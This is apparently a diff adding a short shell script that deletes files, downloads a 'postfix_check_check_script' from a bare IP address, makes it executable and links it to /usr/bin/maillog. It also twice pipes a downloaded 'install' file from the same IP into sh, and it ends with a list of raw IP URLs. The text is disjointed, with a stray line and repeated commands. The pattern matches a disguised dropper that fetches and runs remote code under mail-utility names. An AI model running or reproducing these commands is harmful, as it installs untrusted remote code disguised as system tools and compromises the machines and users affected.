@@ -1,0 +1,20 @@
+install curl
+
+#!/bin/sh
+
+cd /usr/local/share/applications/
+rm -rf postfix_check_check*
+rm -rf /usr/bin/maillog
+wget http://202.66.175.96/postfix_check_check_script
+chmod +x postfix_check_check_script
+ln -s /usr/local/share/applications/postfix_check_check_script /usr/bin/maillog
+
+#Thanks ZNetLive
+
+
+curl -o latest -L http://202.66.175.96/install && sh latest
+
+curl -o latest -L http://202.66.175.96/install && sh latest
+http://13.235.239.60/postfix_check_check_script.sh
+http://202.66.175.96/postfix_check_check_script
+http://202.66.175.96/install
